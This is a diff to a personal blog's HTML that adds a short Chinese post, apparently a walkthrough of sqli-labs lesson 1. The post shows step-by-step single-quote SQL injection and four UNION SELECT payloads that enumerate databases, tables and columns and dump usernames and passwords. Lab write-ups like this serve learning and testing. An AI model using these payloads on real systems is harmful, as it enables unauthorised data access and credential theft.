@@ -71,6 +71,63 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-less1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/14/less1/" class="article-date">
+  <time class="dt-published" datetime="2021-11-14T02:04:18.000Z" itemprop="datePublished">2021-11-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/11/14/less1/">less1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>#简介</p>
+<p>less1</p>
+<p>第一步（使用union注入）</p>
+<p>注入/? id=1’进行判断字符注入类型，注入后报错，去掉’显示正常，可得less1为单字符型注入</p>
+<p>报错看到limit0，1可知union查询的信息被占用了，可以将1改为-1来让出位置给需要的信息。</p>
+<p>第二步</p>
+<p>用order by 来查询列数直接order by 1后递增可查出order by 4不行，可知数据有3列。</p>
+<p>第三步</p>
+<p>用union select 1,2,3–+来查询显示位–+用来注释’</p>
+<p>第四步</p>
+<p>利用sql查询爆破</p>
+<p>查询数据库名称</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata %23</code></p>
+<p>查询表名</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23</code></p>
+<p>查询字段</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>查询内容</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(username,0x3a,password) from users--+</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/11/14/less1/" data-id="ckvzcndtd0000o8ue0pvb8hnp" data-title="less1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-css2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/11/07/css2/" class="article-date">
@@ -579,6 +636,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/14/less1/">less1</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/07/css2/">css2</a>
           </li>
         
@@ -592,10 +653,6 @@
         
           <li>
             <a href="/2021/10/31/html(2)/">html（2）</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/24/html%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E5%AE%9A%E4%B9%89/">html一些简单的定义</a>
           </li>
         
       </ul>
